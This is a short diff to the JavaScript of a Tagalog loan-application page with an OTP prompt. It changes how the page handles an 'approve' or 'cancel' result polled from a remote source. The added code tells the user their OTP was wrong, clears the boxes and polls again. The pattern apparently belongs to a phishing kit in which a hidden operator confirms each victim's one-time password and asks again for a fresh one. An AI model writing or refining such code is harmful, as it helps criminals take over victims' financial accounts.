@@ -375,14 +375,26 @@
             if (pollInterval1) clearInterval(pollInterval1);
             if (pollInterval2) clearInterval(pollInterval2);
 
-            spinnerOverlay.style.display = 'none';
-            resultOverlay.style.display = 'flex';
-
             const parts = callbackData.split('_');
             if (parts[0] === 'approve') {
+                spinnerOverlay.style.display = 'none';
+                resultOverlay.style.display = 'flex';
                 resultMessage.textContent = 'Naaprubahan na ang iyong loan. Magkakaroon ka ng kumpirmasyon sa loob ng 15 minuto. Maraming salamat.';
             } else if (parts[0] === 'cancel') {
-                resultMessage.textContent = 'Mangyaring mag-apply muli at siguraduhing tama ang iyong impormasyon at ang iyong minimum Main USD Balance ay hindi bababa sa ₱30.00. Salamat.';
+                spinnerOverlay.style.display = 'none';
+                resultOverlay.style.display = 'flex';
+                resultMessage.textContent = 'Ang ibinigay na OTP ay mali o na-expire na, mangyaring maglagay ng wastong OTP.';
+
+                setTimeout(() => {
+                    resultOverlay.style.display = 'none';
+                    otpBoxes.forEach(box => {
+                        box.value = '';
+                    });
+                    checkOtpComplete();
+                    otpBoxes[0].focus();
+                    actionProcessed = false;
+                    startPollingBoth();
+                }, 2500);
             }
         }
 
